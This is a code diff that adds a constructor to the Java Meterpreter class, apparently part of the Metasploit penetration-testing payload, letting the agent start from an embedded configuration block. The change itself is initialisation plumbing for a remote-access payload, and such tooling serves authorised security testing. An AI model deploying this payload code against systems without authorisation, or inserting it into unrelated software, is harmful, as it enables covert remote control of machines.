@@ -172,6 +172,32 @@ public class Meterpreter {
         }
     }
 
+    /**
+     * Initialize the meterpreter from an embedded config block. No upstream
+     * stream is consumed; transports open their own connections.
+     *
+     * @param configBlock    Raw TLV configuration bytes
+     * @param loadExtensions Whether to load extension jars
+     * @param redirectErrors Whether to redirect errors to the internal buffer
+     */
+    public Meterpreter(byte[] configBlock, boolean loadExtensions, boolean redirectErrors) throws Exception {
+        this.loadExtensions = loadExtensions;
+        this.commandManager = new CommandManager();
+        this.channels.add(null);
+
+        if (redirectErrors) {
+            errBuffer = new ByteArrayOutputStream();
+            err = new PrintStream(errBuffer);
+        } else {
+            errBuffer = null;
+            err = System.err;
+        }
+
+        loadConfiguration(null, null, configBlock);
+        this.ignoreBlocks = 0;
+        startExecuting();
+    }
+
     public TransportList getTransports() {
         return this.transports;
     }
